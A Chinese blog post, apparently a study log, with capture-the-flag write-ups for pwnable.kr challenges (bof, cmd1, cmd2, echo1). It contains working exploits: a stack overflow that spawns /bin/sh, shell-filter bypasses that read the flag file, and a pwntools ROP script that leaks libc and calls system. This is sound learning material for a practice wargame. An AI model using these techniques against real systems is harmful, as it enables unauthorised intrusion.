---
title: pwnable.kr 学习记录
date: 2021-03-19 13:20:21
tags: [pwn, writeup]
---

# [Toddler's Bottle] bof

```c
unsigned int __cdecl func(int a1)
{
  char s[32]; // [esp+1Ch] [ebp-2Ch] BYREF
  unsigned int v3; // [esp+3Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  puts("overflow me : ");
  gets(s);
  if ( a1 == '\xCA\xFE\xBA\xBE' )
    system("/bin/sh");
  else
    puts("Nah..");
  return __readgsdword(0x14u) ^ v3;
}
```

要覆盖func函数的参数，x86是栈上传参，返回地址后就是参数 `a1`, 而 `s` 距离 `ebp` 有 0x2c, 那么需要 0x2c + 8 也就是 52 个长度

```bash
✘ 4uuu Nya ~ (python -c "print 'A'*52+'\xBE\xBA\xFE\xCA'";cat)|nc pwnable.kr 9000
ls
bof
bof.c
flag
log
log2
super.pl
```


# [Toddler's Bottle] cmd1

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}
```

比较常见的绕关键字

```bash
cmd1@pwnable:~$ ./cmd1 'export PATH=/bin;cat fla*'
******
```

# [Toddler's Bottle] cmd2

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
```

在cmd1的基础上增加了很多过滤，而且把`export`,`PATH`都过滤掉了，考虑用绝对路径来使用命令，但是需要构造 `/`, 根目录下 `pwd` 刚好就是 `/`，所以就好解决了

```bash
cmd2@pwnable:~$ ./cmd2 'cd ..;cd ..;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*'
cd ..;cd ..;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*
******
```

# [Rookiss] echo1

只有功能1可以使用，是一个比较明显的溢出(x64)，程序没有开任何保护

![](/images/20210319001.png)

ret2shellcode使用`jmp rsp`即可，比较简单，用rop来做一下这个题

```c
__int64 echo1()
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  (*((void (__fastcall **)(void *))o + 3))(o);
  get_input(s, 128LL);
  puts(s);
  (*((void (__fastcall **)(void *))o + 4))(o);
  return 0LL;
}
```

s的位置在 `rbp-20h`, 那么需要溢出到 `0x20 + 8`，通常办法是使用 `system`，那么就需要找一个 `pop rdi;ret` 的gadget，然而并找不到 

![](/images/20210319002.png)

回过头来看到程序中存在bss段上8位长度的变量id

```c
printf("hey, what's your name? : ");
__isoc99_scanf("%24s", v6);
v3 = o;
*(_QWORD *)o = v6[0];
v3[1] = v6[1];
v3[2] = v6[2];
id = v6[0];
```

由于v6是自己输入的名字，所以是可控的，那么可以考虑在这个地方写入`pop rdi;ret`来实现rop，接下来就是非常常见的方法，通过泄漏puts函数地址确定基址，然后构造 `system('/bin/sh')` 即可，exp如下

```python
from pwn import *

# io = remote('pwnable.kr', 9010)
io = process('./echo1')
elf = ELF('./echo1')

context.arch='amd64'
context.log_level = 'DEBUG'

id_addr = p64(elf.sym['id'])
echo_func = p64(elf.sym['echo1'])
puts_plt = p64(elf.plt['puts'])
puts_got = p64(elf.got['puts'])

payload = 'A' * 0x20 + id_addr * 2 + puts_got + puts_plt + echo_func
io.sendlineafter('hey, what\'s your name? :', asm('pop rdi;ret'))
io.sendlineafter('>', '1')
io.sendline(payload)
puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base = (puts_addr - 0x06f6a0)
system_addr = p64(libc_base + 0x0453a0)
bin_sh = p64(libc_base + 0x18ce17)
print 'libc base ===> %s' % hex(libc_base)
payload = 'A' * 0x20 + id_addr * 2 + bin_sh + system_addr
io.sendline(payload)
io.interactive()
```

![](/images/20210319003.png)

> 但是很僵硬的是，这种办法打远程打不通，用ret2shellcode才拿到了flag